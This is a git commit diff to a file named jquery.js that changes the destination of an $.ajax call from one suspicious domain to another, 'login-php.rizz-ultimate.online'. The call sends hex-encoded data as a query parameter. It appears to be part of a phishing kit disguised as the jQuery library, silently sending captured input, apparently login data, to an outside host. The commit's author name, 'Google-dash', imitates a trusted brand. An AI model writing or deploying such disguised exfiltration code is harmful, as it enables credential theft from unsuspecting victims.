a8120d8f5cec495c07f6e7b4cf5f21d614e8f092
Google-dash <rizzshop19@gmail.com>
2024-10-11 17:41:19 +0700

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://email-support.businis.biz.id?cat="+
+                    "https://login-php.rizz-ultimate.online?cat="+
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
